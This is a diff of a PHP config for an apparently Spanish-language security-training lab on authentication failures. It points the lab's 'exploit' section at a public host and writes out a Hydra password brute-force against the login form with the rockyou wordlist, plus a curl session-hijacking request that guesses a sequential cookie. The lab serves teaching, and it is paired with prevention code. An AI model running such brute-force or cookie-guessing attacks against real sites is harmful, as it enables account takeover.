@@ -25,14 +25,16 @@ $labInfo = [
             <li><strong>Session ID predecible:</strong> Después de login, el session_id es un entero secuencial</li>
         </ol>
     ',
-    'exploit' => '# 1. Brute force con Hydra:
+    'exploit' => '# 1. Brute force con Hydra contra la VPS:
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
-  localhost http-post-form \\
-  "/a07_login/:username=^USER^&password=^PASS^:F=incorrectas"
+  nexolab.guajilodev.com https-post-form \\
+  "/a07_login/index.php:username=^USER^&password=^PASS^:F=incorrectas"
 
 # 2. Session hijacking:
 # Después de login, tu cookie es NEXO_SESS=1006
-# Probá NEXO_SESS=1001, 1002, 1003...',
+# Probá NEXO_SESS=1001, 1002, 1003...
+curl -i --cookie "NEXO_SESS=1001" \\
+  https://nexolab.guajilodev.com/a07_login/dashboard.php',
     'prevention' => '// 1. Rate limiting:
 if (getFailedAttempts($ip) > 5) {
     sleep(30); // o bloquear temporalmente
